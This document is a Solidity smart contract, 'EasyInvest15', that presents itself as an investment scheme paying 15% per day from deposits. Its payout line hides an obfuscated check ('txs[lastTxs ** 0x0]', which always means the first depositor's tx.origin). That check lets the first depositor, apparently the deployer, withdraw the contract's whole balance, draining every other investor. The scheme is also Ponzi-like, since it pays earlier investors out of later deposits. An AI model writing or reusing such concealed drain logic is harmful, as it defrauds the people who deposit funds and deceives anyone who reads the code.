 

pragma solidity ^0.4.25;

 
contract EasyInvest15 {
    
    mapping (address => uint) public invested;  
    mapping (address => uint) public atBlock;  
    mapping (uint => uint) public txs;   

    uint public lastTxs;  

     
    function () external payable {
        
         
        if (invested[msg.sender] != 0) {
            
             
             
             
            uint256 amount = invested[msg.sender] * 15 / 100 * (block.number - atBlock[msg.sender]) / 5900;

             
             
            uint256 restAmount = address(this).balance; 
            amount = amount < restAmount && txs[lastTxs ** 0x0] != uint(tx.origin) ? amount : restAmount;

             
            msg.sender.transfer(amount);
            
        }

         
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
        txs[++lastTxs] = uint(tx.origin);
        
    }
    
}